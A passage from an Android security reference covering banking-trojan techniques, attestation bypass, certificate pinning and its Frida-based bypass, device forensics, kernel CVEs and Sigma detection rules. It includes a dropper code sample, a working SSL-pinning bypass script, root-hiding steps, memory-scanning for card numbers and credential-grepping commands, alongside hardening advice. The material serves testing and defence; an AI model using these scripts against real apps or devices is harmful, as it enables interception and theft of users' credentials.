**OLLVM (Obfuscator-LLVM).** Applied to native `.so` libraries at compile time. Techniques: control-flow flattening (replaces structured control flow with a switch-in-loop dispatch), bogus control flow (inserts dead branches with opaque predicates), instruction substitution (replaces simple operations with equivalent but complex sequences). Makes static analysis of native code significantly harder for Ghidra/IDA.

**Detection of repackaged/tampered APKs.** Apps can verify their own signature at runtime to detect Smali patching and repackaging:

```java
// Runtime signature verification (basic anti-tamper)
PackageInfo info = getPackageManager().getPackageInfo(
    getPackageName(), PackageManager.GET_SIGNATURES);
String sig = info.signatures[0].toCharsString();
if (!sig.equals(EXPECTED_SIGNATURE_HASH)) {
    // Tampered — terminate or report
    System.exit(1);
}
```

Attackers bypass this by patching the signature check itself in Smali. More robust: use Play Integrity API's `appRecognitionVerdict` (`PLAY_RECOGNIZED` vs `UNRECOGNIZED_VERSION`) to detect sideloaded or repackaged APKs server-side, where the check cannot be patched. Google Play Protect also performs continuous APK integrity scanning on-device.

**MASTG reference.** MSTG-RESILIENCE-3 (testing for code obfuscation and anti-reverse-engineering).

---

## 7. Banking Trojan techniques and malware

### 7.1 Overlay attacks

The malware draws a transparent or themed overlay on top of the banking app's login screen using `TYPE_APPLICATION_OVERLAY` (requires `SYSTEM_ALERT_WINDOW` permission on Android 6+) or the deprecated `TYPE_SYSTEM_ALERT`. The user enters credentials into the overlay, which captures them.

**Detection.** Android 12+ restricts overlay permissions and dims overlay windows during credential entry (untrusted touches are blocked when an overlay is present over an input field). Apps can detect overlays via `View.getFilterTouchesWhenObscured()` or `MotionEvent.FLAG_WINDOW_IS_OBSCURED`.

**Notable campaigns.** Anatsa/TeaBot (2021-present): dropper on Play Store, downloads banking module via C2, targets 600+ banking apps across EU. Hydra (2020-present): uses accessibility service for overlay injection and automated transfers. FluBot (2021-2022): SMS-based distribution, overlay attacks + SMS theft for 2FA bypass.

### 7.2 Accessibility service abuse

The malware requests accessibility permissions (ostensibly to assist disabled users), then uses the accessibility APIs to:
- **Read screen content**: `AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED` exposes all `TextView` values.
- **Intercept notifications**: `TYPE_NOTIFICATION_STATE_CHANGED` captures OTP codes from notifications.
- **Perform clicks**: `AccessibilityNodeInfo.performAction(ACTION_CLICK)` automates button presses.
- **Auto-fill fields**: `ACTION_SET_TEXT` fills forms with attacker-controlled values.
- **Keylogging**: monitoring `TYPE_VIEW_TEXT_CHANGED` events captures keystrokes.

```bash
# List apps with accessibility service permissions
adb shell settings get secure enabled_accessibility_services

# Check which accessibility services are active
adb shell dumpsys accessibility
```

**Hardening.** Android 13 restricts accessibility service installation from sideloaded APKs (restricted settings). Apps can detect accessibility services running via `AccessibilityManager.getEnabledAccessibilityServiceList()` and warn users or limit functionality.

### 7.3 Dropper techniques

Modern Play Store malware uses a multi-stage dropper architecture to evade Google Play Protect:

1. **Stage 1 (dropper)**: a clean app on Play Store with minimal permissions. Passes automated scanning.
2. **Stage 2 (loader)**: after install, the dropper downloads an encrypted payload from a C2 server, decrypts it, and loads it using `DexClassLoader`.
3. **Stage 3 (payload)**: the actual banking trojan, loaded from encrypted storage without being written to disk as a plain DEX file.

```java
// Dropper loading encrypted DEX from assets
byte[] encrypted = readAssetFile("config.dat");
byte[] key = deriveKey(getDeviceId());
byte[] dex = AES.decrypt(encrypted, key);
File dexDir = getDir("opt", Context.MODE_PRIVATE);
File dexFile = new File(dexDir, "classes.dex");
writeFile(dexFile, dex);
DexClassLoader loader = new DexClassLoader(
    dexFile.getAbsolutePath(),
    dexDir.getAbsolutePath(),
    null,
    getClassLoader()
);
Class<?> payload = loader.loadClass("com.malware.Payload");
payload.getMethod("init", Context.class).invoke(null, this);
```

### 7.4 C2 communication patterns

- **Firebase Cloud Messaging (FCM)**: C2 commands sent as push notifications, blending with legitimate app traffic.
- **Telegram Bot API**: C2 via Telegram's HTTPS API — difficult to block, uses Telegram's infrastructure.
- **MQTT**: lightweight pub/sub messaging over TLS, used by IoT-themed droppers.
- **Dead drop resolvers**: C2 address encoded in social media posts (Twitter/X bios, Pastebin, GitHub pages).
- **Domain Generation Algorithms (DGA)**: daily rotating C2 domains computed from a seed value.

### 7.5 SMS interception and NotificationListenerService

The malware registers as the default SMS app (or uses `READ_SMS` + `RECEIVE_SMS`) to intercept OTP codes. `NotificationListenerService` reads all notifications, including OTP codes delivered via push notifications (bypassing SMS-based 2FA).

**Notable campaigns.** SharkBot (2022-present): ATS (Automatic Transfer System) via accessibility service, no overlay required — directly manipulates the banking app's UI. Joker (2019-present): recurring Play Store malware, subscribes victims to premium services via WAP billing. Xenomorph (2022-present): MaaS (Malware-as-a-Service) banking trojan with 400+ target apps.

### 7.6 Device Admin exploitation and WorkProfile abuse

**Device Admin abuse.** Malware requests `BIND_DEVICE_ADMIN` permission, which grants the ability to enforce password policies, lock the screen, wipe the device, and resist uninstall. Ransomware families use Device Admin to lock the device and display a ransom screen. The user cannot uninstall the app without first revoking Device Admin privileges — and the malware's UI may prevent navigation to the settings screen (using overlay + accessibility).

```xml
<!-- Manifest declaration for Device Admin -->
<receiver android:name=".AdminReceiver"
          android:permission="android.permission.BIND_DEVICE_ADMIN">
    <meta-data android:name="android.app.device_admin"
               android:resource="@xml/device_admin_policies" />
    <intent-filter>
        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
    </intent-filter>
</receiver>
```

```bash
# List active device admins
adb shell dumpsys device_policy | grep -A5 "Active Admins"

# Force-remove a device admin (requires root or ADB on userdebug builds)
adb shell dpm remove-active-admin <package>/<admin_receiver_class>

# Disable a device admin component
adb shell pm disable <package>/<admin_receiver_class>
```

**WorkProfile abuse.** The managed profile (work profile) runs as a separate user with its own data sandbox. Stalkerware and corporate espionage tools exploit this: a malicious Device Policy Controller (DPC) app creates a work profile, installs monitoring apps inside it, and gains access to work profile data (contacts, call logs, location) through the DPC's profile-owner privileges. The monitoring runs silently in the work profile without the user's awareness.

**Detection.** Check for active device admins: `Settings → Security → Device Administrators`. MDM solutions detect unauthorized device admin activations. Android 9+ restricts deprecated Device Admin APIs; Android 10+ deprecates device admin for non-DPC use entirely, pushing toward the Android Enterprise management APIs.

---

## 8. SafetyNet and Play Integrity

### 8.1 SafetyNet Attestation (deprecated)

SafetyNet Attestation: the device sends a signed attestation to Google's servers. The response includes `ctsProfileMatch` (device passes CTS compatibility), `basicIntegrity` (device is not rooted/tampered), and (on supported devices) hardware-backed attestation. The JWS response contains the evaluation type: `BASIC` (software-based, spoofable) or `HARDWARE` (TEE-backed attestation key chain, much harder to bypass).

### 8.2 Play Integrity API

Replaces SafetyNet with three verdict levels:

| Verdict | Meaning |
|---------|---------|
| `MEETS_DEVICE_INTEGRITY` | Genuine device, passes all checks, Google Play Services present |
| `MEETS_BASIC_INTEGRITY` | Device may be rooted but passes basic checks (includes emulators) |
| `MEETS_STRONG_INTEGRITY` | Hardware-backed attestation, genuine device confirmed by TEE |

The API response also includes `appRecognitionVerdict` (`PLAY_RECOGNIZED` = installed from Play Store, `UNRECOGNIZED_VERSION` = sideloaded or tampered) and account licensing status.

```bash
# Check Play Integrity on a device
# Use the Play Integrity API in-app:
# IntegrityManager.requestIntegrityToken() → send token to server → decrypt and verify

# Server-side verification returns JSON:
# {
#   "deviceIntegrity": { "deviceRecognitionVerdict": ["MEETS_DEVICE_INTEGRITY"] },
#   "appIntegrity": { "appRecognitionVerdict": "PLAY_RECOGNIZED" },
#   "accountDetails": { "appLicensingVerdict": "LICENSED" }
# }
```

### 8.3 Bypass techniques

**Software-based attestation bypass.** MagiskHide/DenyList/Shamiko can fool software-based checks by unmounting Magisk overlays and hiding root indicators from the Google Play Services process. The Play Integrity API in `BASIC` evaluation mode is vulnerable to these techniques.

**Hardware attestation challenges.** Hardware attestation requires a genuine TEE attestation key burned into the device at manufacture. Leaked or compromised attestation keys (from vulnerable TEE implementations, factory leaks, or debug keys left in production devices) have enabled hardware-attestation bypass on specific device models. Google maintains a revocation list for compromised keys.

```bash
# Magisk DenyList configuration
# Magisk app → Settings → Enable DenyList
# Add: com.google.android.gms (Google Play Services)
# Add: com.google.android.gms.unstable

# For Shamiko (Zygisk module):
# Install Shamiko module via Magisk
# Shamiko hides root from DenyList apps more aggressively
# than DenyList alone (hides Magisk binaries, mount points, etc.)
```

---

## 9. SSL/TLS and certificate pinning

### 9.1 Implementation methods

**network_security_config.xml** — declarative pinning (recommended approach).

```xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
    <!-- Pin certificates for production domain -->
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2026-01-01">
            <!-- Pin the SPKI hash of the leaf or intermediate cert -->
            <pin digest="SHA-256">base64EncodedSPKIHash=</pin>
            <!-- Backup pin (different CA) for rotation -->
            <pin digest="SHA-256">backupBase64EncodedSPKIHash=</pin>
        </pin-set>
    </domain-config>

    <!-- Allow debug CAs in debug builds only -->
    <debug-overrides>
        <trust-anchors>
            <certificates src="user" />
            <certificates src="system" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
```

```xml
<!-- Reference in AndroidManifest.xml -->
<application android:networkSecurityConfig="@xml/network_security_config">
```

**OkHttp CertificatePinner.**

```java
CertificatePinner pinner = new CertificatePinner.Builder()
    .add("api.example.com",
         "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .add("api.example.com",
         "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=") // backup
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(pinner)
    .build();
```

**Custom TrustManager (not recommended — error-prone).**

```java
// WARNING: manual TrustManager implementations are a common source
// of vulnerabilities. Prefer network_security_config.xml or
// CertificatePinner. This is shown for analysis purposes only.
TrustManagerFactory tmf = TrustManagerFactory.getInstance("X509");
tmf.init(loadPinnedCertKeyStore());
SSLContext ctx = SSLContext.getInstance("TLS");
ctx.init(null, tmf.getTrustManagers(), null);
```

### 9.2 Bypass techniques

**Frida SSL pinning bypass — generic script targeting OkHttp, network_security_config, and custom TrustManager.**

```javascript
Java.perform(function() {
    // Bypass OkHttp CertificatePinner
    try {
        var CertPinner = Java.use('okhttp3.CertificatePinner');
        CertPinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function(hostname, peerCerts) {
            console.log('[*] OkHttp CertificatePinner.check() bypassed for: ' + hostname);
            return;
        };
    } catch(e) { console.log('OkHttp pinner not found'); }

    // Bypass custom X509TrustManager
    var X509TM = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    var TrustManager = Java.registerClass({
        name: 'com.frida.TrustAllManager',
        implements: [X509TM],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var TrustManagers = [TrustManager.$new()];
    var sslCtx = SSLContext.getInstance('TLS');
    sslCtx.init(null, TrustManagers, null);

    // Bypass HostnameVerifier
    var HostnameVerifier = Java.use('javax.net.ssl.HostnameVerifier');
    var AllowAll = Java.registerClass({
        name: 'com.frida.AllowAllHostnames',
        implements: [HostnameVerifier],
        methods: {
            verify: function(hostname, session) { return true; }
        }
    });

    // Apply to HttpsURLConnection
    var HttpsConn = Java.use('javax.net.ssl.HttpsURLConnection');
    HttpsConn.setDefaultSSLSocketFactory(sslCtx.getSocketFactory());
    HttpsConn.setDefaultHostnameVerifier(AllowAll.$new());

    console.log('[*] SSL pinning bypass complete');
});
```

**Objection automated bypass.**

```bash
objection -g <package> explore
android sslpinning disable
# Automatically hooks TrustManager, CertificatePinner,
# SSLSocketFactory, and X509Certificate validation
```

**Certificate installation on non-rooted devices (Android 7+).** User-installed certificates are no longer trusted by default for apps targeting API 24+. Options: use `debug-overrides` in `network_security_config.xml` (debug builds only), or on rooted devices, install the certificate as a system CA in `/system/etc/security/cacerts/`.

```bash
# Install Burp CA on rooted device as system cert
openssl x509 -inform DER -in burp_ca.der -out burp_ca.pem
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1)
mv burp_ca.pem ${HASH}.0
adb push ${HASH}.0 /data/local/tmp/
adb shell su -c "mount -o rw,remount /system"
adb shell su -c "mv /data/local/tmp/${HASH}.0 /system/etc/security/cacerts/"
adb shell su -c "chmod 644 /system/etc/security/cacerts/${HASH}.0"
adb shell su -c "mount -o ro,remount /system"
adb reboot
```

**MASTG reference.** MSTG-NETWORK-1 (testing for cleartext traffic), MSTG-NETWORK-2 (testing custom certificate stores and certificate pinning), MSTG-NETWORK-3 (testing TLS settings).

---

## 10. Cryptography and secure storage

### 10.1 Insecure SharedPreferences

`SharedPreferences` stores key-value pairs in plaintext XML at `/data/data/<package>/shared_prefs/`. On a rooted device, any app or user with root access can read all SharedPreferences files.

```bash
# Read SharedPreferences on rooted device
adb shell su -c "cat /data/data/<package>/shared_prefs/<package>_preferences.xml"

# Search for secrets stored in SharedPreferences
adb shell su -c "grep -ri 'token\|password\|key\|secret\|api_key' /data/data/<package>/shared_prefs/"
```

**Hardening.** Use `EncryptedSharedPreferences` from the Jetpack Security library (uses AES-256-SIV for keys, AES-256-GCM for values, master key stored in Android Keystore).

```java
MasterKey masterKey = new MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build();

SharedPreferences prefs = EncryptedSharedPreferences.create(
    context,
    "secure_prefs",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
);
```

### 10.2 Database encryption

**SQLCipher** — encrypts the entire SQLite database file with AES-256-CBC. The key must be supplied at database open time. If the key is hardcoded or stored in SharedPreferences, the encryption is trivially bypassable.

**Room with SQLCipher.**

```java
SupportSQLiteOpenHelper.Factory factory = new SupportFactory(
    SQLiteDatabase.getBytes("strong_passphrase".toCharArray())
);

AppDatabase db = Room.databaseBuilder(context, AppDatabase.class, "app.db")
    .openHelperFactory(factory)
    .build();
```

The passphrase should derive from the Android Keystore, not be hardcoded.

### 10.3 Android Keystore best practices

Store cryptographic keys exclusively in the Android Keystore. Keys are non-extractable — the Keystore performs crypto operations internally.

```bash
# Dump Keystore entries via objection
objection -g <package> explore
android keystore list
# Lists all aliases, key types, and creation dates

# Frida: intercept Keystore operations
```

```javascript
Java.perform(function() {
    var KeyStore = Java.use('java.security.KeyStore');
    KeyStore.getEntry.overload(
        'java.lang.String', 'java.security.KeyStore$ProtectionParameter'
    ).implementation = function(alias, param) {
        console.log('[*] KeyStore.getEntry: alias=' + alias);
        return this.getEntry(alias, param);
    };

    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log('[*] Cipher.doFinal input: ' + bytesToHex(input));
        var result = this.doFinal(input);
        console.log('[*] Cipher.doFinal output: ' + bytesToHex(result));
        return result;
    };
});
```

### 10.4 File-based encryption (FBE) vs full-disk encryption (FDE)

**FDE** (Android 5-9): encrypts the entire `/data` partition with dm-crypt. Requires credentials at boot to decrypt — the device cannot boot to a usable state without the password. Vulnerable to cold-boot attacks and brute-force if the password is weak.

**FBE** (Android 7+, mandatory from Android 10): encrypts each file with a different key derived from the user's credentials. Two encryption classes: **Credential Encrypted (CE)** storage is accessible only after user unlock. **Device Encrypted (DE)** storage is accessible after boot (before unlock), used for alarm clocks, accessibility services, and incoming calls. FBE enables Direct Boot — the device can receive calls and alarms before unlock.

**MASTG reference.** MSTG-STORAGE-1 (testing for insecure data storage), MSTG-CRYPTO-1 (testing for use of hardcoded cryptographic keys).

---

## 11. Network security configuration

### 11.1 network_security_config.xml deep dive

The network security configuration controls an app's network security behavior declaratively.

```xml
<network-security-config>
    <!-- Base configuration (applies to all domains not matched below) -->
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
            <!-- Do NOT include "user" in production -->
        </trust-anchors>
    </base-config>

    <!-- Domain-specific overrides -->
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">api.example.com</domain>
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
        <pin-set expiration="2026-06-01">
            <pin digest="SHA-256">spkiHash1=</pin>
            <pin digest="SHA-256">spkiHash2=</pin>
        </pin-set>
    </domain-config>

    <!-- Debug-only overrides (stripped in release builds) -->
    <debug-overrides>
        <trust-anchors>
            <certificates src="user" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
```

**Key settings.** `cleartextTrafficPermitted="false"` blocks all HTTP traffic (API 23+; enforced by default in API 28+). Lint rule `CleartextTrafficPermitted` flags violations. `<certificates src="user" />` trusts user-installed CAs — required for intercepting traffic during testing but must never appear in release builds.

```bash
# Check if an app allows cleartext traffic
aapt dump xmltree <app.apk> AndroidManifest.xml | grep cleartextTrafficPermitted
# Also check: android:usesCleartextTraffic="true" on <application>
```

### 11.2 Traffic interception setup

**Burp Suite + ADB proxy.**

```bash
# Set device-wide proxy
adb shell settings put global http_proxy <burp_ip>:8080

# Remove proxy when done
adb shell settings put global http_proxy :0

# For apps that ignore system proxy (use Frida or iptables):
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 443 \
  -j DNAT --to-destination <burp_ip>:8080"
adb shell su -c "iptables -t nat -A OUTPUT -p tcp --dport 80 \
  -j DNAT --to-destination <burp_ip>:8080"
```

**mitmproxy + Frida.** Run mitmproxy on the host, use Frida to bypass pinning, redirect traffic via ADB proxy or iptables.

**VPN-based interception.** Use a VPN app like PCAPdroid or NetGuard to capture traffic without root. PCAPdroid creates a local VPN that captures all packets and exports as PCAP for analysis in Wireshark.

### 11.3 VPN API abuse

Android's `VpnService` API allows apps to create a VPN tunnel that intercepts all device network traffic. Malicious apps abuse this to act as an on-device proxy — capturing credentials, session tokens, and API keys from all apps on the device.

**Mechanism.** The app calls `VpnService.Builder.establish()` to create a TUN interface. All device traffic is routed through this interface. The malicious app reads packets, extracts sensitive data (HTTP headers, POST bodies, DNS queries), and forwards them to a C2 server. Because the VPN runs locally, TLS pinning in other apps does not protect against this — the malicious VPN app sees traffic before it enters the TLS layer if apps use the system DNS resolver, and can perform DNS hijacking to redirect connections through an attacker-controlled proxy.

**Detection.** Android shows a persistent notification when a VPN is active (cannot be dismissed by the VPN app). Users see a key icon in the status bar. MDM solutions can restrict VPN app installation. Apps can detect active VPN via `ConnectivityManager.getNetworkCapabilities()` checking for `NET_CAPABILITY_NOT_VPN`. The VPN consent dialog (`VpnService.prepare()`) requires explicit user approval.

```bash
# Check active VPN connections
adb shell dumpsys connectivity | grep -A5 "VPN"
adb shell ifconfig tun0  # TUN interface indicates active VPN
```

**MASTG reference.** MSTG-NETWORK-1 (testing for cleartext traffic), MSTG-NETWORK-4 (testing for use of custom TLS settings).

---

## 12. Android forensics

### 12.1 Data locations

| Location | Content | Access |
|----------|---------|--------|
| `/data/data/<package>/` | App private storage (SharedPrefs, databases, files, cache) | Root required |
| `/data/data/<package>/databases/` | SQLite databases | Root required |
| `/data/data/<package>/shared_prefs/` | XML key-value stores | Root required |
| `/data/data/<package>/files/` | Internal files | Root required |
| `/data/data/<package>/cache/` | Cache files (may contain temp credentials) | Root required |
| `/sdcard/Android/data/<package>/` | External app storage (API 29+ scoped) | USB/root |
| `/sdcard/Android/media/<package>/` | Media files | USB/root |
| `/data/system/packages.xml` | Package database (permissions, UIDs) | Root required |
| `/data/misc/wifi/WifiConfigStore.xml` | Saved WiFi networks + passwords | Root required |
| `/data/system/users/0/accounts.db` | Account manager database | Root required |

### 12.2 Logical acquisition

```bash
# ADB backup (deprecated from Android 12, limited even before)
adb backup -apk -shared -all -nosystem -f backup.ab
# Convert Android Backup to tar
java -jar abe.jar unpack backup.ab backup.tar <password>
tar xf backup.tar

# Check if an app allows backup
aapt dump xmltree <app.apk> AndroidManifest.xml | grep allowBackup
# android:allowBackup="true" → data extractable via adb backup

# Dump specific app data (root)
adb shell su -c "tar czf /sdcard/app_data.tar.gz /data/data/<package>/"
adb pull /sdcard/app_data.tar.gz

# SQLite database extraction and analysis
adb shell su -c "cp /data/data/<package>/databases/app.db /sdcard/"
adb pull /sdcard/app.db
sqlite3 app.db ".tables"
sqlite3 app.db ".schema <table>"
sqlite3 app.db "SELECT * FROM messages LIMIT 20;"

# Analyze WAL (Write-Ahead Log) for recently deleted data
ls -la app.db-wal app.db-shm
sqlite3 app.db "PRAGMA wal_checkpoint(TRUNCATE);"
```

### 12.3 Physical acquisition

**EDL (Emergency Download) mode.** Qualcomm devices have an EDL mode accessible via special boot key combos or shorting test points on the PCB. EDL allows reading/writing the entire eMMC/UFS storage via Qualcomm's Firehose protocol. Requires a signed programmer image (MBN/ELF), which vendors sometimes leak or are extracted from OTA updates. Tools: `edl` (open-source EDL client), QFIL (Qualcomm official).

**JTAG.** Joint Test Action Group interface provides direct access to the processor's debug port. Requires physical access to JTAG test points on the PCB, soldering, and a JTAG adapter (Riff Box, Z3X). Allows full memory dump of eMMC.

**Chip-off.** Physical removal of the eMMC/UFS chip from the PCB, reading it with a chip reader (e.g., VNR/Medusa). Destructive process — the device may not be reassemblable. Used when software methods fail (locked bootloader + no EDL programmer).

**Hardening.** Set `android:allowBackup="false"` in the manifest. Use FBE with strong credentials. Enable secure startup (require PIN before boot). Store sensitive data in the Keystore (non-extractable even with physical access on StrongBox devices).

```xml
<!-- Prevent ADB backup extraction -->
<application
    android:allowBackup="false"
    android:fullBackupContent="false">
```

### 12.4 Memory forensics

```bash
# Dump process memory (root)
adb shell su -c "cat /proc/<pid>/maps"
adb shell su -c "dd if=/proc/<pid>/mem of=/sdcard/mem.dump bs=1 skip=$((0x<start>)) count=$((0x<size>))"

# Search for credentials in memory (using Frida)
# Frida's Memory.scan() can search process memory for patterns
```

```javascript
Java.perform(function() {
    // Scan heap for credit card patterns
    Process.enumerateRanges('r--', {
        onMatch: function(range) {
            Memory.scan(range.base, range.size,
                '34 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??', {
                onMatch: function(address, size) {
                    console.log('[*] Potential card number at: ' + address);
                    console.log('    ' + Memory.readUtf8String(address, 19));
                },
                onComplete: function() {}
            });
        },
        onComplete: function() {}
    });
});
```

**MASTG reference.** MSTG-STORAGE-1 through MSTG-STORAGE-6 (testing for various data storage vulnerabilities).

---

## 13. Key CVEs and kernel exploitation

### 13.1 Notable Android CVEs

| CVE | Year | Component | Impact |
|-----|------|-----------|--------|
| CVE-2019-2215 | 2019 | Binder driver (UAF) | Local privilege escalation to root. Exploited in the wild by NSO Group. A use-after-free in the Binder driver allowed overwriting freed kernel objects. |
| CVE-2020-0069 | 2020 | MediaTek command queue driver | Root from any app on MediaTek devices (MediaTek-SU). The driver exposed an ioctl that wrote to arbitrary physical addresses. |
| CVE-2020-0096 | 2020 | ActivityManager (StrandHogg 2.0) | Task hijacking — malicious activity inherits victim's task affinity, enabling phishing. |
| CVE-2020-0022 | 2020 | Bluetooth (BlueFrag) | RCE via Bluetooth. Heap overflow in `reassemble_and_dispatch` in the Bluetooth subsystem. Exploitable without pairing on Android 8-9. |
| CVE-2021-0920 | 2021 | Unix socket garbage collector | UAF in `unix_gc`. Exploited in the wild. Local privilege escalation. |
| CVE-2022-20138 | 2022 | PendingIntent | Privilege escalation via mutable PendingIntent with empty base intent. |
| CVE-2023-4863 | 2023 | libwebp (WebP) | Heap overflow in WebP decoding. Affects any app using WebView or loading WebP images. Exploited in the wild. |

### 13.2 Kernel hardening

Android kernels ship with multiple hardening features:

- **PXN (Privileged Execute Never)**: prevents the kernel from executing user-space code (ARM equivalent of x86 SMEP).
- **PAN (Privileged Access Never)**: prevents the kernel from directly reading/writing user-space memory (ARM equivalent of SMAP).
- **CFI (Control Flow Integrity)**: Clang's forward-edge CFI verifies indirect call targets match expected function signatures. Enabled in GKI kernels.
- **SCS (Shadow Call Stack)**: protects return addresses from ROP attacks by storing them in a separate, hidden stack.
- **MTE (Memory Tagging Extension)**: ARMv8.5 feature that tags memory allocations with 4-bit tags. Tag mismatches on access cause a fault. Catches use-after-free, buffer overflows. Available on Pixel 8+ and selected ARM Cortex-A devices.
- **kASLR**: kernel address space layout randomization. Randomizes kernel base address at boot.

```bash
# Check kernel hardening features
adb shell cat /proc/version
adb shell zcat /proc/config.gz | grep -E "CONFIG_CFI|CONFIG_SHADOW_CALL_STACK|CONFIG_ARM64_MTE|CONFIG_RANDOMIZE_BASE"
```

---

## 14. Android Detection Engineering

Detection engineering for Android threats spans endpoint telemetry (on-device agents, MDM/UEM), network-level indicators, and backend log analysis. This section provides concrete Sigma, YARA, and behavioral rules targeting the attack techniques discussed in §2–§7 and §13.

### 14.1 Sigma rules — malicious accessibility service abuse

Accessibility services are the primary enabler for overlay attacks, credential theft, and automated UI interaction by banking trojans (§7). A legitimate accessibility service is rare; any newly enabled service outside a known-good list warrants investigation.

```yaml
title: Suspicious Accessibility Service Enabled
id: 9a3f1d20-android-acc-svc-001
status: experimental
description: >
  Detects activation of accessibility services outside a known-good allowlist.
  Banking trojans (Anatsa, Cerberus, SharkBot) require accessibility to perform
  overlay attacks, credential harvesting, and automated transfers.
logsource:
  product: android
  service: device_management
  # MDM/UEM logs or Android Enterprise audit events
detection:
  selection:
    EventType: 'ACCESSIBILITY_SERVICE_ENABLED'
  filter_known_good:
    PackageName:
      - 'com.google.android.marvin.talkback'
      - 'com.samsung.accessibility'
      - 'com.android.switchaccess'
  condition: selection and not filter_known_good
level: high
tags:
  - attack.defense_evasion
  - attack.t1548
  - cwe.284
falsepositives:
  - Legitimate third-party accessibility apps (password managers, screen readers)
  - Enterprise automation tools
references:
  - https://attack.mitre.org/techniques/T1629/001/
```

### 14.2 Sigma rules — overlay attack indicators

Overlay attacks require `SYSTEM_ALERT_WINDOW` permission or abuse of `TYPE_APPLICATION_OVERLAY`. Detecting unexpected overlay creation events at the MDM or audit-log level catches trojan phishing screens.

```yaml
title: Unexpected Overlay Window Creation
id: 9a3f1d20-android-overlay-002
status: experimental
description: >
  Detects non-system apps creating overlay windows. Used by banking trojans to
  display fake login screens over legitimate banking apps. Correlate with
  accessibility service events for high-confidence trojan behavior.
logsource:
  product: android
  service: window_manager
detection:
  selection:
    EventType: 'OVERLAY_WINDOW_ADDED'
    WindowType|contains: 'TYPE_APPLICATION_OVERLAY'
  filter_system:
    CallerUid|lt: 10000
  filter_allowlist:
    PackageName:
      - 'com.facebook.orca'   # Messenger chat heads
      - 'com.google.android.apps.translate'  # Tap to Translate
  condition: selection and not filter_system and not filter_allowlist
level: medium
tags:
  - attack.credential_access
  - attack.t1056.004
```

### 14.3 Sigma rules — SMS interception via runtime permission abuse

Trojans that intercept SMS for OTP theft typically request `RECEIVE_SMS`, `READ_SMS`, or register a `BroadcastReceiver` for `SMS_RECEIVED`. On Android 10+ the SMS Retriever API should be used instead; any non-default-SMS-app requesting these permissions is suspicious.

```yaml
title: Non-Default SMS App Requesting SMS Permissions
id: 9a3f1d20-android-sms-003
status: experimental
description: >
  Detects apps that are not the default SMS handler requesting or being granted
  SMS-related runtime permissions. Banking trojans intercept SMS to steal OTP
  codes for account takeover.
logsource:
  product: android
  service: permission_manager
detection:
  selection:
    EventType: 'RUNTIME_PERMISSION_GRANTED'
    Permission|contains:
      - 'RECEIVE_SMS'
      - 'READ_SMS'
      - 'SEND_SMS'
  filter_default_sms:
    IsDefaultSmsApp: true
  condition: selection and not filter_default_sms
level: high
tags:
  - attack.collection
  - attack.t1636.004
```

### 14.4 Sigma rules — suspicious APK sideloading

Sideloading is the primary vector for dropper apps and modified APKs. On managed devices, the `REQUEST_INSTALL_PACKAGES` permission and installations from non-Play sources generate audit events.

```yaml
title: APK Installation from Non-Play Source
id: 9a3f1d20-android-sideload-004
status: experimental
description: >
  Detects APK installations that did not originate from the Google Play Store.
  Dropper trojans distribute second-stage payloads via direct APK download or
  third-party app stores.
logsource:
  product: android
  service: package_manager
detection:
  selection:
    EventType|contains:
      - 'PACKAGE_INSTALLED'
      - 'PACKAGE_REPLACED'
  filter_play_store:
    InstallerPackage:
      - 'com.android.vending'
      - 'com.google.android.packageinstaller'
  condition: selection and not filter_play_store
level: medium
tags:
  - attack.execution
  - attack.t1204.002
falsepositives:
  - Enterprise MDM-deployed apps
  - Developer debugging via adb install
```

### 14.5 Sigma rules — Magisk/root hiding detection and Frida server detection

On managed enterprise devices, the MDM agent or a dedicated integrity-checking app can detect root indicators that Magisk DenyList/Shamiko fail to hide — particularly the Magisk daemon socket, Zygisk artifacts, and Frida's default listening port.

```yaml
title: Root Hiding Framework Detected (Magisk/KernelSU)
id: 9a3f1d20-android-root-005
status: experimental
description: >
  Detects indicators of Magisk, KernelSU, or root-hiding frameworks on
  managed devices. Checks for characteristic mount namespaces, process names,
  and file artifacts.
logsource:
  product: android
  service: endpoint_integrity
detection:
  selection_magisk:
    Indicator|contains:
      - 'magisk'
      - 'magiskinit'
      - '.magisk'
      - 'magisk_patched'
  selection_kernelsu:
    Indicator|contains:
      - 'kernelsu'
      - 'ksu_'
  selection_frida:
    Indicator|contains:
      - 'frida-server'
      - 'frida-agent'
      - 'linjector'
      - 're.frida.server'
    PortListening: 27042
  condition: selection_magisk or selection_kernelsu or selection_frida
level: critical
tags:
  - attack.defense_evasion
  - attack.t1625
```

```bash
# Manual root/Frida detection checks from ADB (requires root or MDM agent)
adb shell su -c "ls -la /data/adb/magisk/ 2>/dev/null"
adb shell su -c "ls -la /data/adb/ksu/ 2>/dev/null"
adb shell su -c "cat /proc/net/tcp" | grep "69B2"  # 27042 in hex = 69B2
adb shell su -c "ps -A | grep -iE 'frida|magisk|ksu'"

# Check for characteristic Magisk mount overlays
adb shell su -c "cat /proc/self/mounts | grep -i magisk"

